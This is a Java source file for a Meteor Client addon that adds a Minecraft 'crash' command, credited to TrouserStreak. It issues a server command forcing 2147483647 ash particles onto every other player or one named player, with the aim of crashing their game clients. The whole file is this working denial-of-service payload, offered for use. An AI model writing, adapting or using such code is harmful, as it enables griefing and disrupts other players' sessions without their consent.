package spigey.asteroide.commands;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.PlayerListEntryArgumentType;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import net.minecraft.text.Text;

import java.util.Objects;
import java.util.concurrent.CopyOnWriteArrayList;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
import static meteordevelopment.meteorclient.MeteorClient.mc;
import static spigey.asteroide.util.perm;

public class CrashPlayer extends Command {
    public CrashPlayer() {
        super("crash", "Crashes a player | Credits to TrouserStreak");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(ctx -> {
            CopyOnWriteArrayList<PlayerListEntry> players = new CopyOnWriteArrayList<>(Objects.requireNonNull(mc.getNetworkHandler()).getPlayerList());
            if (players.size() <= 1) {  // Check if there is only one player (you) on the server
                error("No other players found on the server | Credits to TrouserStreak");
                return SINGLE_SUCCESS;
            }
            assert mc.player != null;
            if (!mc.player.hasPermissionLevel(2)) {
                error(perm(2));
            }
            ChatUtils.sendPlayerMsg("/execute at @a[name=!" + mc.player.getName().getLiteralString() + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!" + mc.player.getName().getLiteralString() + "]");
            StringBuilder playerNames = new StringBuilder("Attempting to Crash players: | Credits to TrouserStreak");
            for (PlayerListEntry player : players) {
                if (!player.getProfile().getId().equals(mc.player.getGameProfile().getId())) {
                    playerNames.append(player.getProfile().getName()).append(", ");
                }
            }
            playerNames.setLength(playerNames.length() - 2);  // Remove the extra comma and space at the end
            ChatUtils.sendMsg(Text.of(playerNames.toString()));
            return SINGLE_SUCCESS;
        });
        builder.then(argument("player", PlayerListEntryArgumentType.create()).executes(context -> {
            GameProfile profile = PlayerListEntryArgumentType.get(context).getProfile();
            if (profile != null) {
                if (Objects.requireNonNull(mc.getNetworkHandler()).getPlayerList().stream().anyMatch(player -> player.getProfile().getId().equals(profile.getId()))) {
                    assert mc.player != null;
                    ChatUtils.sendPlayerMsg("/execute at " + profile.getName() + " run particle ash ~ ~ ~ 1 1 1 1 2147483647 force " + profile.getName());
                    ChatUtils.sendMsg(Text.of("Attempting to Crash player: " + profile.getName() + " | Credits to TrouserStreak"));
                    if (!mc.player.hasPermissionLevel(2)) {
                        error(perm(2));
                    }
                } else {
                    error("Player not found in the current server | Credits to TrouserStreak");
                }
            } else {
                error("Player profile not found | Credits to TrouserStreak");
            }
            return SINGLE_SUCCESS;
        }));
    }
}
